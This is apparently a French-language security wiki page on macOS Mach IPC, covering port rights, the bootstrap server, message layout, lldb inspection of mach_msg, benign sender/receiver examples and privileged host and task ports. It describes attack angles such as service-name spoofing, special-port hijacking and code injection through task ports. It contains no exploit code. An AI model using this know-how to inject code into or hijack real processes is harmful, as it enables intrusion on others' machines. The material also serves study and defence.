# macOS IPC - Communication inter-processus

{{#include ../../../../banners/hacktricks-training.md}}

## Messagerie Mach via les Ports

### Informations de base

Mach utilise les **tâches** comme **plus petite unité** de partage des ressources, et chaque tâche peut contenir **plusieurs threads**. Ces **tâches et threads sont mappés 1:1 sur les processus et threads POSIX**.

La communication entre les tâches s'effectue via la communication inter-processus (IPC) de Mach, en utilisant des canaux de communication unidirectionnels. **Les messages sont transférés entre les ports**, qui fonctionnent comme des **files de messages** gérées par le kernel.

Un **port** est l'élément **de base** de l'IPC de Mach. Il peut être utilisé pour **envoyer des messages et en recevoir**.

Chaque processus possède une **table IPC**, dans laquelle il est possible de trouver les **ports Mach du processus**. Le nom d'un port Mach est en réalité un nombre (un pointeur vers l'objet du kernel).

Un processus peut également envoyer un nom de port avec certains droits **à une autre tâche**, et le kernel fera apparaître cette entrée dans la **table IPC de l'autre tâche**.

### Droits des ports

Les droits des ports, qui définissent les opérations qu'une tâche peut effectuer, sont essentiels à cette communication. Les **droits de port** possibles sont ([définitions disponibles ici](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Droit de réception**, qui permet de recevoir les messages envoyés au port. Les ports Mach sont des files MPSC (multiple-producer, single-consumer), ce qui signifie qu'il ne peut y avoir qu'**un seul droit de réception pour chaque port** dans tout le système (contrairement aux pipes, où plusieurs processus peuvent tous détenir des descripteurs de fichier vers l'extrémité de lecture d'un même pipe).
- Une **tâche disposant du droit de réception** peut recevoir des messages et **créer des droits d'envoi**, ce qui lui permet d'envoyer des messages. À l'origine, seule la **tâche propriétaire possède le droit de réception sur son por**t.
- Si le propriétaire du droit de réception **meurt** ou le détruit, le **droit d'envoi devient inutilisable (dead name)**.
- **Droit d'envoi**, qui permet d'envoyer des messages au port.
- Le droit d'envoi peut être **cloné**, de sorte qu'une tâche possédant un droit d'envoi puisse le cloner et **l'accorder à une troisième tâche**.
- Notez que les **droits de port** peuvent également être **transmis** via des messages Mach.
- **Droit d'envoi unique**, qui permet d'envoyer un message au port, puis disparaît.
- Ce droit ne peut pas être **cloné**, mais il peut être **déplacé**.
- **Droit d'ensemble de ports**, qui désigne un _ensemble de ports_ plutôt qu'un port unique. Retirer un message d'un ensemble de ports retire un message de l'un des ports qu'il contient. Les ensembles de ports peuvent être utilisés pour écouter simultanément sur plusieurs ports, un peu comme `select`/`poll`/`epoll`/`kqueue` sous Unix.
- **Dead name**, qui n'est pas réellement un droit de port, mais simplement un espace réservé. Lorsqu'un port est détruit, tous les droits de port existants vers ce port deviennent des dead names.

**Les tâches peuvent transférer des droits d'ENVOI à d'autres**, leur permettant ainsi de leur envoyer des messages en retour. Les **droits d'ENVOI peuvent également être clonés, afin qu'une tâche puisse dupliquer ce droit et l'accorder à une troisième tâche**. Cela, associé à un processus intermédiaire appelé **bootstrap server**, permet une communication efficace entre les tâches.

### File Ports

Les file ports permettent d'encapsuler des descripteurs de fichier dans des ports Mac (en utilisant les droits de port Mach). Il est possible de créer un `fileport` à partir d'un FD donné à l'aide de `fileport_makeport`, et de créer un FD à partir d'un fileport à l'aide de `fileport_makefd`.

### Établissement d'une communication

Comme indiqué précédemment, il est possible d'envoyer des droits via des messages Mach. Cependant, il est **impossible d'envoyer un droit sans déjà posséder un droit** permettant d'envoyer un message Mach. Alors, comment la première communication est-elle établie ?

Pour cela, le **bootstrap server** (**launchd** sur macOS) intervient. Comme **tout le monde peut obtenir un droit d'ENVOI vers le bootstrap server**, il est possible de lui demander un droit permettant d'envoyer un message à un autre processus :

1. La tâche **A** **crée un nouveau port** et obtient le **droit de RÉCEPTION** sur celui-ci.
2. La tâche **A**, qui détient le droit de RÉCEPTION, **génère un droit d'ENVOI pour le port**.
3. La tâche **A** établit une **connexion** avec le **bootstrap server** et **lui envoie le droit d'ENVOI** du port qu'elle a généré au début.
- Rappelez-vous que tout le monde peut obtenir un droit d'ENVOI vers le bootstrap server.
4. La tâche A envoie un message `bootstrap_register` au bootstrap server afin **d'associer le port fourni à un nom**, tel que `com.apple.taska`.
5. La tâche **B** interagit avec le **bootstrap server** pour effectuer une **recherche bootstrap** du nom du service (`bootstrap_lookup`). Pour pouvoir répondre, la tâche B lui envoie un **droit d'ENVOI vers un port qu'elle a précédemment créé**, dans le message de recherche. Si la recherche réussit, le **server duplique le droit d'ENVOI** reçu de la tâche A et **le transmet à la tâche B**.
- Rappelez-vous que tout le monde peut obtenir un droit d'ENVOI vers le bootstrap server.
6. Grâce à ce droit d'ENVOI, la **tâche B** peut **envoyer** un **message** à la **tâche A**.
7. Pour une communication bidirectionnelle, la tâche **B** génère généralement un nouveau port avec un droit de **RÉCEPTION** et un droit d'**ENVOI**, puis donne le **droit d'ENVOI à la tâche A** afin qu'elle puisse envoyer des messages à la **TÂCHE B** (communication bidirectionnelle).

Le bootstrap server **ne peut pas authentifier** le nom de service revendiqué par une tâche. Cela signifie qu'une **tâche** pourrait potentiellement **usurper l'identité de n'importe quelle tâche système**, par exemple en **revendiquant faussement le nom d'un service d'autorisation**, puis en approuvant chaque demande.

Apple stocke ensuite les **noms des services fournis par le système** dans des fichiers de configuration sécurisés, situés dans des répertoires **protégés par SIP** : `/System/Library/LaunchDaemons` et `/System/Library/LaunchAgents`. Le **binaire associé** est également stocké à côté de chaque nom de service. Le bootstrap server crée et conserve un **droit de RÉCEPTION pour chacun de ces noms de service**.

Pour ces services prédéfinis, le processus de **lookup** diffère légèrement. Lorsqu'un nom de service est recherché, launchd démarre dynamiquement le service. Le nouveau workflow est le suivant :

- La tâche **B** lance une **recherche bootstrap** d'un nom de service.
- **launchd** vérifie si la tâche est en cours d'exécution et, si ce n'est pas le cas, la **démarre**.
- La tâche **A** (le service) effectue un **bootstrap check-in** (`bootstrap_check_in()`). Le **bootstrap** server crée alors un droit d'ENVOI, le conserve et **transfère le droit de RÉCEPTION à la tâche A**.
- launchd duplique le **droit d'ENVOI et l'envoie à la tâche B**.
- La tâche **B** génère un nouveau port avec un droit de **RÉCEPTION** et un droit d'**ENVOI**, puis donne le **droit d'ENVOI à la tâche A** (le service), afin qu'elle puisse envoyer des messages à la **TÂCHE B** (communication bidirectionnelle).

Cependant, ce processus ne s'applique qu'aux tâches système prédéfinies. Les tâches qui ne sont pas des tâches système continuent de fonctionner comme décrit précédemment, ce qui pourrait permettre une usurpation.

> [!CAUTION]
> Par conséquent, launchd ne doit jamais se terminer brutalement, sinon tout le système se terminera brutalement.

### Un message Mach

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

La fonction `mach_msg`, essentiellement un appel système, est utilisée pour envoyer et recevoir des messages Mach. La fonction exige que le message à envoyer soit fourni comme premier argument. Ce message doit commencer par une structure `mach_msg_header_t`, suivie du contenu réel du message. La structure est définie comme suit :
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Les processus possédant un _**receive right**_ peuvent recevoir des messages sur un port Mach. À l’inverse, les **senders** se voient accorder un _**send**_ ou un _**send-once right**_. Le send-once right sert exclusivement à envoyer un seul message, après quoi il devient invalide.<sup>[[11]](#references)</sup>

Le champ initial **`msgh_bits`** est une bitmap :

- Le premier bit (le plus significatif) sert à indiquer qu’un message est complexe (plus d’informations ci-dessous)
- Les 3e et 4e bits sont utilisés par le kernel
- Les **5 bits les moins significatifs du 2e octet** peuvent être utilisés pour le **voucher** : un autre type de port permettant d’envoyer des combinaisons clé/valeur.
- Les **5 bits les moins significatifs du 3e octet** peuvent être utilisés pour le **local port**
- Les **5 bits les moins significatifs du 4e octet** peuvent être utilisés pour le **remote port**

Les types pouvant être spécifiés dans les voucher, local et remote ports sont les suivants (d’après [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)) :<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Par exemple, `MACH_MSG_TYPE_MAKE_SEND_ONCE` peut être utilisé pour **indiquer** qu’un **send-once** **right** doit être dérivé et transféré pour ce port. Il est également possible de spécifier `MACH_PORT_NULL` afin d’empêcher le destinataire de pouvoir répondre.

Afin d’obtenir une **communication bi-directionnelle** simple, un processus peut spécifier un **mach port** dans l’**en-tête** du **message mach**, appelé _reply port_ (**`msgh_local_port`**), sur lequel le **récepteur** du message peut **envoyer une réponse** à ce message.

> [!TIP]
> Notez que ce type de communication bi-directionnelle est utilisé dans les messages XPC qui attendent une réponse (`xpc_connection_send_message_with_reply` et `xpc_connection_send_message_with_reply_sync`). Mais **généralement, des ports différents sont créés**, comme expliqué précédemment, pour établir la communication bi-directionnelle.

Les autres champs de l’en-tête du message sont :

- `msgh_size` : la taille du paquet entier.
- `msgh_remote_port` : le port auquel ce message est envoyé.
- `msgh_voucher_port` : [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id` : l’ID de ce message, interprété par le récepteur.

> [!CAUTION]
> Notez que les **messages mach sont envoyés via un `mach port`**, qui est un canal de communication **à récepteur unique** et à **émetteurs multiples**, intégré au kernel mach. **Plusieurs processus** peuvent **envoyer des messages** à un mach port, mais à tout moment, **un seul processus peut lire** depuis celui-ci.

Les messages sont ensuite constitués de l’en-tête **`mach_msg_header_t`**, suivi du **body** et du **trailer** (le cas échéant), et peuvent accorder la permission d’y répondre. Dans ces cas, le kernel doit simplement transmettre le message d’une task à l’autre.

Un **trailer** correspond à des **informations ajoutées au message par le kernel** (elles ne peuvent pas être définies par l’utilisateur), qui peuvent être demandées lors de la réception du message avec les flags `MACH_RCV_TRAILER_<trailer_opt>` (différentes informations peuvent être demandées).

#### Messages complexes

Cependant, il existe d’autres messages plus **complexes**, comme ceux qui transmettent des rights de port supplémentaires ou partagent de la mémoire, pour lesquels le kernel doit également envoyer ces objets au destinataire. Dans ce cas, le bit de poids fort de l’en-tête `msgh_bits` est défini.

Les descripteurs pouvant être transmis sont définis dans [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
En 32 bits, tous les descripteurs font 12 octets et le type de descripteur se trouve dans le 11e octet. En 64 bits, les tailles varient.

> [!CAUTION]
> Le kernel copiera les descripteurs d'une tâche vers l'autre, mais en **créant d'abord une copie dans la mémoire du kernel**. Cette technique, connue sous le nom de « Feng Shui », a été exploitée dans plusieurs exploits pour faire en sorte que le **kernel copie des données dans sa mémoire**, en faisant envoyer des descripteurs à un processus à lui-même. Le processus peut ensuite recevoir les messages (le kernel les libérera).
>
> Il est également possible d'**envoyer des port rights à un processus vulnérable**, et les port rights apparaîtront simplement dans le processus (même s'il ne les traite pas).

### Mac Ports APIs

Notez que les ports sont associés au namespace de la tâche. Ainsi, pour créer ou rechercher un port, le namespace de la tâche est également interrogé (plus d'informations dans `mach/mach_port.h`) :<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`** : **Créer** un port.
- `mach_port_allocate` peut également créer un **port set** : un receive right sur un groupe de ports. Lorsqu'un message est reçu, le port d'origine est indiqué.
- `mach_port_allocate_name` : Modifier le nom du port (par défaut, un entier 32 bits)
- `mach_port_names` : Obtenir les noms des ports d'une cible
- `mach_port_type` : Obtenir les rights d'une tâche sur un nom
- `mach_port_rename` : Renommer un port (comme dup2 pour les FDs)
- `mach_port_allocate` : Allouer un nouveau RECEIVE, PORT_SET ou DEAD_NAME
- `mach_port_insert_right` : Créer un nouveau right dans un port pour lequel vous disposez du RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`** : Fonctions utilisées pour **envoyer et recevoir des messages Mach**. La version overwrite permet de spécifier un buffer différent pour la réception du message (l'autre version le réutilisera).

### Debug mach_msg

Comme les fonctions **`mach_msg`** et **`mach_msg_overwrite`** sont celles utilisées pour envoyer et recevoir des messages, définir un breakpoint sur celles-ci permettrait d'inspecter les messages envoyés et reçus.

Par exemple, commencez à déboguer n'importe quelle application que vous pouvez déboguer, car elle chargera **`libSystem.B`, qui utilisera cette fonction**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Pour obtenir les arguments de **`mach_msg`**, vérifiez les registres. Voici les arguments (depuis [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)) :
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Obtenez les valeurs des registres :
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Inspectez l’en-tête du message en vérifiant le premier argument :
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Ce type de `mach_msg_bits_t` est très courant pour permettre une réponse.

### Énumérer les ports
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Le **nom** est le nom par défaut attribué au port (vérifiez comment il **augmente** dans les 3 premiers octets). L’**`ipc-object`** est l’**identifiant** unique **obfusqué** du port.\
Notez également que les ports disposant uniquement du droit **`send`** **identifient leur propriétaire** (nom du port + pid).\
Notez aussi l’utilisation de **`+`** pour indiquer les **autres tâches connectées au même port**.

Il est également possible d’utiliser [**procesxp**](https://www.newosxbook.com/tools/procexp.html) pour voir aussi les **noms des services enregistrés** (avec SIP désactivé en raison de la nécessité de disposer de `com.apple.system-task-port`) :
```
procesp 1 ports
```
Vous pouvez installer cet outil sur iOS en le téléchargeant depuis [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Exemple de code

Notez comment le **sender** **alloue** un port, crée un **send right** pour le nom `org.darlinghq.example` et l'envoie au **bootstrap server**, tandis que le sender demande le **send right** de ce nom et l'utilise pour **envoyer un message**.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Ports privilégiés

Il existe certains ports spéciaux qui permettent d'**effectuer certaines actions sensibles ou d'accéder à certaines données sensibles** lorsqu'une tâche dispose des permissions **SEND** sur ceux-ci. Cela rend ces ports très intéressants du point de vue d'un attaquant, non seulement en raison de leurs capacités, mais aussi parce qu'il est possible de **partager les permissions SEND entre les tâches**.

### Ports spéciaux de l'hôte

Ces ports sont représentés par un nombre.

Les droits **SEND** peuvent être obtenus en appelant **`host_get_special_port`**, et les droits **RECEIVE** en appelant **`host_set_special_port`**. Cependant, les deux appels nécessitent le port **`host_priv`**, auquel seul root peut accéder. De plus, par le passé, root pouvait appeler **`host_set_special_port`** et effectuer un hijack arbitraire, ce qui permettait par exemple de contourner les signatures de code en effectuant un hijack de `HOST_KEXTD_PORT` (SIP empêche désormais cela).

Ils sont divisés en 2 groupes : les **7 premiers ports appartiennent au kernel** : le 1 est `HOST_PORT`, le 2 est `HOST_PRIV_PORT`, le 3 est `HOST_IO_MASTER_PORT` et le 7 est `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Ceux commençant **à partir** du numéro **8** sont **détenus par les daemons système** et peuvent être trouvés dans [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Port de l'hôte** : si un processus dispose du privilège **SEND** sur ce port, il peut obtenir des **informations** sur le **système** en appelant ses routines, comme :
- `host_processor_info` : obtenir les informations sur le processeur
- `host_info` : obtenir les informations sur l'hôte
- `host_virtual_physical_table_info` : table des pages virtuelles/physiques (nécessite MACH_VMDEBUG)
- `host_statistics` : obtenir les statistiques de l'hôte
- `mach_memory_info` : obtenir la disposition de la mémoire du kernel
- **Port Host Priv** : un processus disposant du droit **SEND** sur ce port peut effectuer des **actions privilégiées**, comme afficher les données de démarrage ou tenter de charger une extension du kernel. Le **processus doit être root** pour obtenir cette permission.
- De plus, pour appeler l'API **`kext_request`**, il est nécessaire de disposer d'autres entitlements **`com.apple.private.kext*`**, qui ne sont accordés qu'aux binaires Apple.
- Les autres routines pouvant être appelées sont :
- `host_get_boot_info` : obtenir `machine_boot_info()`
- `host_priv_statistics` : obtenir les statistiques privilégiées
- `vm_allocate_cpm` : allouer de la mémoire physique contiguë
- `host_processors` : droit SEND vers les processeurs de l'hôte
- `mach_vm_wire` : rendre la mémoire résidente
- Comme **root peut accéder à cette permission**, il pourrait appeler **`host_set_[special/exception]_port[s]`** pour **effectuer un hijack des ports spéciaux ou d'exception de l'hôte**.

Il est possible de **voir tous les ports spéciaux de l'hôte** en exécutant :
```bash
procexp all ports | grep "HSP"
```
### Ports spéciaux de Task

Il s'agit de ports réservés à des services bien connus. Il est possible de les obtenir ou de les définir en appelant `task_[get/set]_special_port`. Ils se trouvent dans `task_special_ports.h` :
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Depuis [ici](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: Le port utilisé pour contrôler cette task. Utilisé pour envoyer des messages qui affectent la task. Il s'agit du port retourné par **mach_task_self (voir Task Ports ci-dessous)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Le bootstrap port de la task. Utilisé pour envoyer des messages demandant le retour d'autres ports de services système.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Le port utilisé pour demander des informations sur l'host conteneur. Il s'agit du port retourné par **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Le port désignant la source depuis laquelle cette task obtient sa mémoire kernel wired.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Le port désignant la source depuis laquelle cette task obtient sa mémoire par défaut gérée par le memory manager.

### Task Ports

À l'origine, Mach n'avait pas de «processus», mais des «tasks», qui étaient plutôt considérées comme des conteneurs de threads. Lorsque Mach a été fusionné avec BSD, **chaque task a été associée à un processus BSD**. Ainsi, chaque processus BSD possède les informations nécessaires pour être un processus, et chaque task Mach possède également ses mécanismes internes (à l'exception de l'inexistant pid 0, qui correspond à `kernel_task`).

Deux fonctions très intéressantes sont liées à cela:<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Obtient un droit `SEND` pour la task associée au `pid` spécifié et le fournit au `target_task_port` indiqué (qui est généralement la task appelante ayant utilisé `mach_task_self()`, mais qui peut être un port SEND vers une autre task).
- `pid_for_task(task, &pid)`: Étant donné un droit SEND vers une task, détermine à quel PID cette task est associée.

Pour effectuer des actions au sein de la task, celle-ci devait obtenir un droit `SEND` vers elle-même en appelant `mach_task_self()` (qui utilise le `task_self_trap` (28)). Avec cette permission, une task peut effectuer plusieurs actions, telles que:

- `task_threads`: Obtient un droit SEND sur tous les task ports des threads de la task
- `task_info`: Obtient des informations sur une task
- `task_suspend/resume`: Suspend ou reprend une task
- `task_[get/set]_special_port`
- `thread_create`: Crée un thread
- `task_[get/set]_state`: Contrôle l'état de la task
- et davantage d'informations sont disponibles dans [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Notez qu'avec un droit SEND sur le task port d'une **autre task**, il est possible d'effectuer ces actions sur cette autre task.

De plus, le task_port est également le port **`vm_map`**, qui permet de **lire et de modifier la mémoire** au sein d'une task avec des fonctions telles que `vm_read()` et `vm_write()`. Cela signifie essentiellement qu'une task disposant de droits SEND sur le task_port d'une autre task pourra **injecter du code dans cette task**.

Rappelez-vous que, puisque le **kernel est également une task**, si quelqu'un parvient à obtenir des **permissions SEND** sur la **`kernel_task`**, il pourra faire exécuter n'importe quoi au kernel (jailbreaks).

- Appelez `mach_task_self()` pour **obtenir le nom** de ce port pour la task appelante. Ce port est uniquement **hérité** à travers **`exec()`**; une nouvelle task créée avec `fork()` obtient un nouveau task port (dans un cas particulier, une task obtient également un nouveau task port après l'`exec()` d'un binaire suid). La seule manière de créer une task et d'obtenir son port consiste à effectuer le ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) pendant un `fork()`.
- Voici les restrictions d'accès au port (provenant de `macos_task_policy` dans le binaire `AppleMobileFileIntegrity`):
- Si l'application possède l'entitlement **`com.apple.security.get-task-allow`**, les processus du **même utilisateur peuvent accéder au task port** (cet entitlement est couramment ajouté par Xcode pour le debugging). Le processus de **notarization** ne l'autorisera pas dans les releases de production.
